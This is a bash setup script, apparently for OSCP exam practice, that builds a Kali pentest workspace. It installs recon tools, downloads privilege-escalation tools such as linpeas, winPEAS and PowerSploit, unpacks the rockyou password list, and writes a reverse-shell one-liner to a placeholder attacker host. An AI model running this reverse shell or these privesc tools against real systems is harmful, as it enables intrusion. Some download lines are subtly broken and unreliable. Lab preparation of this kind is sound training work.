#!/bin/bash

# Created to automate file structure creation and resource download.

# Run: wget https://raw.githubusercontent.com/Tkprice97/OSCP/main/setup.sh; chmod 770 setup.sh; ./setup.sh

domain=$1
RED="\033[1;31m"
#Color code
RESET="\033[0m"

sudo apt update

sudo apt full-upgrade -y

sudo apt dist-upgrade

echo Project name?

read project

mkdir $project

mkdir $project/evidence | mkdir $project/scans | mkdir $project/tools | mkdir $project/tools/windows | mkdir $project/tools/linux | mkdir $project/tools/shells

mkdir $project/evidence/data | mkdir $project/evidence/screenshots | mkdir $project/evidence/credentials 

sudo apt install seclists -y

sudo apt install masscan

sudo apt install gedit -y

sudo apt install dirsearch

cd ~/$project/scans

wget https://raw.githubusercontent.com/Tkprice97/OSCP/main/url_enum.sh
sudo chmod 770 ./url_enum.sh

cd ~/$project/tools/linux

wget https://github.com/carlospolop/PEASS-ng/releases/download/20230702-bc7ce3ac/linpeas.sh #Allowed by OffSec
sudo chmod 770 linpeas.sh 
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh > linux_exploit_suggester.sh
sudo chmod 770 linux_exploit_suggester.sh
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
sudo chmod 770 LinEnum.sh
wget https://raw.githubusercontent.com/Tkprice97/OSCP/main/autoRecon_setup_part1.sh
sudo chmod 770 ./autorecon_setup_part1.sh
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
sudo chmod 770 ./pspy64
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32
sudo chmod 770 ./pspy32
wget https://raw.githubusercontent.com/Tkprice97/OSCP/main/linux_enumeration.sh
sudo chmod 770 ./linux_enumeration.sh

cd ~/$project/tools/windows

wget https://github.com/carlospolop/PEASS-ng/releases/download/20230702-bc7ce3ac/winPEASx64_ofs.exe
wget https://github.com/carlospolop/PEASS-ng/releases/download/20230702-bc7ce3ac/winPEASx86_ofs.exe
wget https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/Privesc.psd1
wget https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
wget https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/Get-System.ps1

git clone https://github.com/sherlock-project/sherlock.git
cd sherlock
python3 -m pip install -r requirements.txt
cd ..

cd ~/$project/tools/shells

echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT_1 0>&1" > one_line_reverse.sh

sudo apt -y install seclists

sudo gzip -d /home/kali/SecLists-master/Passwords/Leaked-Databases/rockyou.txt.tar.gz

sudo tar -xvf /home/kali/SecLists-master/Passwords/Leaked-Databases/rockyou.txt.tar

sudo apt install gobuster

sudo apt install httprobe

sudo apt install amass

sudo apt install assetfinder

sudo apt install subfinder

sudo apt install libimage-exiftool-perl 

wget https://github.com/sensepost/gowitness/releases/download/2.5.0/gowitness-2.5.0-linux-amd64
sudo chmod 770 ./gowitness-2.5.0-linux-amd64; sudo mv ./gowitness-2.5.0-linux-amd64 /usr/local/bin/gowitness

sudo updatedb

sudo su

cd /home/kali/$project/tools/linux

./autorecon_setup_part1.sh

echo "==============="

echo "RUN AS ROOT ./autorecon_setup_part1.sh"

echo "==============="

#end of script
